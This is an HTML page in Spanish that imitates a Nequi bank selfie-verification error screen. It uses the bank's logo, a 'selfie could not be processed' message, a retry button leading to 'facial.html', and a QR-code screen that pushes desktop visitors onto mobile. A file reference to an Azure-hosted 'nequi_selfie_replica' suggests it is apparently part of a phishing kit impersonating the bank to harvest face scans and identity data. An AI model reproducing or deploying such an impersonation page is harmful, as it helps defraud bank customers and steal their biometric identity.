<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Error al procesar la selfie</title>
<style>
  * { box-sizing: border-box; }

  html, body {
    margin: 0;
    height: 100%;
    background: #FFFFFF;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  }

  .screen {
    min-height: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: space-between;
    padding: calc(env(safe-area-inset-top, 0px) + 6vh) 6vw calc(env(safe-area-inset-bottom, 0px) + 5vh);
  }

  /* Contenedor superior (Logo) */
  .header {
    display: flex;
    justify-content: center;
    width: 100%;
  }

  .logo {
    display: block;
    width: clamp(100px, 24vw, 150px);
    height: auto;
  }

  /* Contenido central (Icono de advertencia y textos) */
  .content {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    margin-top: -5vh;
    width: 100%;
  }

  /* Círculo naranja más pequeño */
  .warning-icon {
    width: 35px;
    height: 35px;
    background-color: #f59e0b;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 24px;
    box-shadow: 0 4px 12px rgba(245, 158, 11, 0.25);
  }

  .warning-icon svg {
    width: 14px;
    height: 22px;
    fill: #FFFFFF;
  }

  /* Título principal */
  h1 {
    font-size: clamp(22px, 5.5vw, 26px);
    font-weight: 700;
    color: #1f2937;
    margin: 0 0 12px 0;
    letter-spacing: -0.3px;
  }

  /* Párrafo de la vista móvil */
  p {
    font-size: clamp(13px, 3.5vw, 16px);
    color: #6b7280;
    margin: 0;
    line-height: 1.4;
  }

  /* Contenedor inferior (Intentos y botón) */
  .footer {
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 16px;
  }

  .attempts {
    font-size: 15px;
    color: #4b5563;
    font-weight: 500;
    margin: 0;
  }

  .btn {
    width: 100%;
    max-width: 440px;
    background-color: #e6007e;
    color: #FFFFFF;
    border: none;
    border-radius: 16px;
    padding: 18px;
    font-size: 17px;
    font-weight: 700;
    cursor: pointer;
    text-align: center;
    transition: background-color 0.2s ease, transform 0.1s ease;
    box-shadow: 0 4px 14px rgba(230, 0, 126, 0.3);
  }

  .btn:active {
    transform: scale(0.98);
    background-color: #cc0070;
  }

  /* Pantalla de bloqueo para PC con Código QR */
  #desktop-blocker {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: #ffffff;
    z-index: 99999;
    flex-direction: column;
    justify-content: flex-start;
    align-items: center;
    padding: 90px;
    text-align: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  }

  /* Logo superior en PC más grande */
  .desktop-logo {
    height: 60px;
    object-fit: contain;
    margin-bottom: 28px;
  }

  .qr-container {
    background: #ffffff;
    padding: 20px;
    border-radius: 20px;
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
    border: 1px solid #f0f0f5;
    margin-bottom: 24px;
  }

  .qr-container img {
    width: 220px;
    height: 220px;
    object-fit: contain;
    display: block;
  }

  .desktop-title {
    font-size: 22px;
    font-weight: 800;
    color: #1e002c;
    margin-bottom: 10px;
  }

  /* Ancho corregido a 380px para que las líneas tengan el ancho idéntico a la otra pantalla */
  .desktop-desc {
    font-size: 15px;
    color: #625768;
    max-width: 380px;
    line-height: 1.4;
    font-weight: 500;
    margin: 0 auto;
  }
</style>
</head>
<body>

<!-- Pantalla exclusiva para PC -->
<div id="desktop-blocker">
  <img class="desktop-logo" src="NequiArchivos/vOLtQz8.png" alt="Nequi" onerror="this.src='vOLtQz8.png';">
  <div class="qr-container">
    <img src="NequiArchivos/codigo_qr.png" alt="Escanea el código QR" onerror="this.src='https_blue-mud-094b42a10_4_azurestaticapps_net_nequi_nequi_selfie_replica_html.png';">
  </div>
  <div class="desktop-title">Escanea el código QR</div>
  <p class="desktop-desc">Usa la cámara de tu celular para escanear el código y continuar con la validación de identidad.</p>
</div>

<main class="screen">

  <!-- Logo superior -->
  <div class="header">
    <img class="logo" src="vOLtQz8.png" alt="Nequi" onerror="this.src='NequiArchivos/vOLtQz8.png'">
  </div>

  <!-- Contenido central -->
  <div class="content">
    <div class="warning-icon">
      <!-- Símbolo de exclamación más grueso -->
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M10 3h4v11h-4V3zm0 13h4v4h-4v-4z"/>
      </svg>
    </div>
    <h1>Error al procesar la selfie</h1>
    <p>No pudimos procesar tu selfie. Por favor intenta de nuevo</p>
  </div>

  <!-- Pie de página con intentos y botón -->
  <div class="footer">
    <p class="attempts">3 intentos restantes</p>
    <button class="btn" onclick="retryCapture()">Intentar de nuevo</button>
  </div>

</main>

<script>
  // Función para detectar si el dispositivo es un computador
  function checkDevice() {
    const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
    if (isDesktop) {
      document.getElementById('desktop-blocker').style.display = 'flex';
    }
  }

  function retryCapture() {
    window.location.href = 'facial.html';
  }

  // Ejecutar verificación al cargar la página
  window.addEventListener('DOMContentLoaded', checkDevice);
</script>

</body>
</html>
